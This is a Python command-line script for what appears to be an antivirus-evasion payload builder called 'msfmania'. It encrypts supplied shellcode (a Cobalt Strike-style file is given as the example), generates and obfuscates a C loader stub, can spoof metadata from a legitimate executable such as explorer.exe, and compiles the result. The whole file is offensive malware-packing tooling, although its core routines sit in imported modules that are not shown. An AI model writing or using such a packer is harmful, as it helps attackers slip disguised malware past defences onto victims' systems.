from msfmania import compiler, core, encryption, evasion, builder
import argparse

if __name__ == '__main__':
    core.banner()

    parser = argparse.ArgumentParser()
    parser.add_argument("-p", "--payload", help="Select the payload file to use (ex: cobalt64.bin)", required=True)
    parser.add_argument("-o", "--output", help="Output path including filename (ex: /path/to/output/payload)", required=True)
    parser.add_argument("-k", "--keysize", help="RC4 key size in bytes (1-3)", type=int, choices=[1, 2, 3], default=1)
    parser.add_argument("-s", "--strip", help="Strip the executable", action="store_true")
    parser.add_argument("--spoof-bin", help="Spoof binary metadata from target executable (ex: assets/explorer.exe)", metavar="TARGET_EXE")

    args = parser.parse_args()

    output_path = args.output
    payload = open(args.payload, "rb").read()
    encrypted_shellcode, payload_hash, salt = encryption.shellcode_encryption(payload, args.keysize)
    
    builder.create_stub(encrypted_shellcode, payload_hash, salt, args.keysize)
    evasion.obfuscate_c_file("/tmp/main.c")
    
    resource_info = None
    if args.spoof_bin:
        resource_info = evasion.extract_binary_metadata(args.spoof_bin)
    
    compiler.compile(output_path, args.strip, resource_info)
    